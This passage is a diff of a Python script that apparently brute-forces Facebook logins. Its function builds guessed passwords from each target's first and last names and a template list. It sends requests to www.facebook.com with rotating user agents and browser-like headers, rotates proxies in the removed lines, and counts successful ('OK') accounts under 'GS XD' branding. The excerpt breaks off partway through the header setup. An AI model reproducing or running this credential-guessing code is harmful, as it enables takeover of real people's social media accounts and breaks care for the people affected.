@@ -1336,16 +1336,20 @@ def ffb6(ids,names,passlist):
 	loop+=1
 		
 def ffb6(ids,names,passlist):
-	global loop,ok,cp
-	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo} [BLADE-XD] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
-	sys.stdout.flush()
-	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
-	ses = requests.Session()
-	for pw in pwv:
+	global loop,oks,cps
+	sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
+	session = requests.Session()
+	try:
+		first = names.split(' ')[0]
 		try:
-			nip=random.choice(prox)
+			last = names.split(' ')[1]
+		except:
+			last = 'Khan'
+		ps = first.lower()
+		ps2 = last.lower()
+		for fikr in passlist:
+			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+			ua=random.choice(ugen)
 			head = {'Host': 'www.facebook.com','viewport-width': '980',
  'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
  'sec-ch-ua-mobile': '?0',
